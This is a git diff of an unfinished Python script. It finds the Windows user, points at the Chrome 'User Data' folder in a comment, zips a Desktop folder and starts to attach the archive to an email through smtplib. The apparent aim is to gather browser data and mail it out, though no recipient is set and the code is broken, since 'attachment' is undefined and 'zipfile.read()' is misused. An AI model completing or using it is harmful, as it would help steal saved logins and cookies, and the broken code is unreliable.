@@ -1,24 +1,25 @@
 import os
 import shutil
-from zipfile import ZipFile
+import zipfile
+import smtplib
+from email import encoders
+from email.mime.base import MIMEBase
+
 
 # Find the user of computer and store it
 user = os.getlogin()
 
 # chrome_data_dir = f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data"
+
+os.chdir(f"C:\\Users\\{user}\\Desktop")
 print(os.getcwd())
 
-# Creating the file to which we will zip everything in
-#with ZipFile(f"C:\\Users\\{user}\\Desktop\\ziptest.zip", "w") as zip_object:
-#    # Iterate through every file/subfile in directory 
-#    for folder_name, sub_folders, file_names in os.walk(f"C:\\Users\\{user}\\Desktop\\examplefolder"):
-#        for filename in file_names:
-#            file_path = os.path.join(folder_name, filename)
-#            zip_object.write(file_path, os.path.basename(file_path))
-#
-#if os.path.exists(f"C:\\Users\\{user}\\Desktop\\ziptest.zip"):
-#   print("ZIP file created")
-#else:
-#   print("ZIP file not created")
+zipped_name = input("What to call the new zip file?: ")
+# Makes a copy of the directory as a .zip file
+shutil.make_archive(f"{zipped_name}", "zip", "examplefolder")
 
-shutil.make_archive("ziptest", "zip",  )
+# data_folder = zipfile.ZipFile(f"{zipped_name}", "w")
+# Handling zip file
+myzip = zipfile.ZipFile(f"{attachment}", "r")
+msg = MIMEBase("application", "zip")
+msg.set_payload(zipfile.read())
